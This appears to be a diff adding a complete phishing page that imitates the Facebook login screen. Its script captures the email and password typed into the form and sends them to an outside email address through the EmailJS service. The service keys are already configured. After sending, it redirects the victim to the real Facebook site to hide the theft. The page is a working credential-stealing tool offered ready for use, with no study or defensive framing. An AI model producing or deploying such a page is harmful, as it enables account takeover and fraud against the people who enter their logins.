@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #e9eff1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: space-between;
+            width: 980px;
+            height: 560px;
+        }
+
+        .login-box {
+            background-color: white;
+            border-radius: 8px;
+            padding: 50px;
+            width: 380px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box h1 {
+            color: #1877f2;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        .field {
+            margin-bottom: 15px;
+        }
+
+        .field label {
+            font-size: 14px;
+            color: #555;
+        }
+
+        .field input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border-radius: 6px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+        }
+
+        .field input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        input[type="submit"] {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #42b72a;
+            text-decoration: none;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+
+        .facebook-image {
+            background: url('https://www.facebook.com/images/fb_icon_325x325.png') no-repeat center center;
+            background-size: contain;
+            height: 100%;
+            width: 50%;
+            border-radius: 8px;
+        }
+
+        .facebook-image-text {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            color: #555;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .divider {
+            margin-top: 20px;
+            border-top: 1px solid #ddd;
+        }
+
+        .login-options {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+
+        .login-options a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .login-options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- Left Side - Facebook logo + Text -->
+    <div class="facebook-image-text">
+        <p>Facebook helps you connect and share with the people in your life.</p>
+    </div>
+
+    <!-- Right Side - Login Form -->
+    <div class="login-box">
+        <h1>Facebook</h1>
+        <form id="form">
+            <div class="field">
+                <label for="user_email">Email or Phone</label>
+                <input type="text" name="user_email" id="user_email" required>
+            </div>
+            <div class="field">
+                <label for="user_password">Password</label>
+                <input type="password" name="user_password" id="user_password" required>
+            </div>
+            <input type="submit" id="button" value="Log In">
+        </form>
+
+        <div class="forgot-password">
+            <a href="#">Forgotten account?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="create-account">
+            <a href="#">Create new account</a>
+        </div>
+
+        <div class="login-options">
+            <a href="#">English (US)</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">বাংলা</a>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+    // Initialize EmailJS with your public key
+    emailjs.init('sLReSyRpxLD4WcUYR');  // Replace with your EmailJS public key
+
+    const btn = document.getElementById('button');
+    const form = document.getElementById('form'); // Get reference to the form
+
+    form.addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const userEmail = document.getElementById('user_email').value;
+
+        // Regular expression for Gmail email or a username
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+        const usernamePattern = /^[a-zA-Z0-9._-]{3,20}$/;
+
+        // Check if user input is either Gmail or a valid username
+        if (!emailPattern.test(userEmail) && !usernamePattern.test(userEmail)) {
+            alert('Please enter a valid Gmail address or username.');
+            return;
+        }
+
+        btn.value = 'Sending...';  // Change button text while sending
+
+        const serviceID = 'service_9z1eqcm';  // Replace with your service ID
+        const templateID = 'template_nf6guoa';  // Replace with your template ID
+
+        // Send form data to EmailJS using emailjs.sendForm with the form element
+        emailjs.sendForm(serviceID, templateID, form)
+            .then(() => {
+                btn.value = 'Log In';
+                alert('Request sent. Please check your Facebook account.');
+
+                // Redirect user to Facebook's web page
+                window.location.href = 'https://web.facebook.com/?_rdc=1&_rdr#';
+            }, (err) => {
+                btn.value = 'Log In';
+                alert('Failed to send email: ' + JSON.stringify(err));
+            });
+    });
+</script>
+
+</body>
+</html>
